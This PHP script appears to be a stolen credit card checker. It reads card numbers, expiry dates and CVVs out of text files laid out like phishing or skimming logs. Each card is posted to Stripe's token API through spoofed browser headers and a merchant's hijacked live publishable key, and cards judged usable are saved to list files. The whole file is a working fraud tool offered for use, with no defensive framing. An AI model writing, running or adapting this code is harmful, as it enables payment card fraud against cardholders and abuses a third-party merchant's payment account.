<?php
function postKartu($dataCard){
	$cardNumber = $dataCard[0];
	$cardCVC = $dataCard[2];
	$arrayDate = explode("/",$dataCard[1]);
	$month = $arrayDate[0];
	$year = $arrayDate[1];
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	 'Content-Type: application/x-www-form-urlencoded',
	'Origin: https://js.stripe.com',
	 'Referer: https://js.stripe.com/v3/controller-b7d81dedeec3c3d419eaeb8fd94a299b.html',
	));
	curl_setopt($curl,CURLOPT_URL, "https://api.stripe.com/v1/tokens");
	curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36");
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS,"card[number]=$cardNumber&card[cvc]=$cardCVC&card[exp_month]=$month&card[exp_year]=$year&guid=2dcd7151-862b-4a71-9121-e8d98a52fc99&muid=fd18d74e-5e1b-4308-b5a4-b1d14d040224&sid=70512436-7714-4c71-a65f-d6949f89d54b&key=pk_live_pKUQzNAmMFumQBqzbE4xxQCy&pasted_fields=number&payment_user_agent=stripe.js%2F51cf2b85%3B+stripe-js-v3%2F51cf2b85&referrer=https://www.mullvad.net/en/account/stripe");
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($curl);
	return $result;
}
print_r($cardNumber);
$options = getopt(null, array(
	"dirName:",
	"dirResult:",
));
foreach ($options as $key => $value) {
   $$key = $value;
}
if(!empty($dirResult)) mkdir($dirResult);
if(empty($dirName)){
	$dir = getcwd();
} else {
	$dir = $dirName."/";
}
$scandir = scandir($dir);
foreach($scandir as $file) {
	$ftype = filetype("$dir/$file");
	if($file != '..' && $file !='.' && preg_match('#.txt#', $file)>0){
		$f = fopen($dir."/".$file, "r");
		$file = fread($f,filesize("$dir/$file"));
		preg_match('/# Cardnumber : ([0-9]{16})/', $file, $a);
		preg_match('/# Expiration : ([0-9]{2}) \/ ([0-9]{2})/', $file, $b);
		unset($b[0]);
		preg_match('/# CVV\/CVV2 : ([0-9]{3,4})/', $file, $c);
		$arr = [$a[1], implode('/', $b), $c[1]];
		fclose($f);
		$send = json_decode(postKartu($arr));
		print_r($send);
		if($send->card->cvc_check == "unavailable") {
			file_put_contents($dir."/".$arr[0].".lst", implode('|', $arr));
			echo "Valid ".$arr[0]."  \n";
		} else {
			echo "Invalid ".$arr[0]."  \n";
		}
	}
}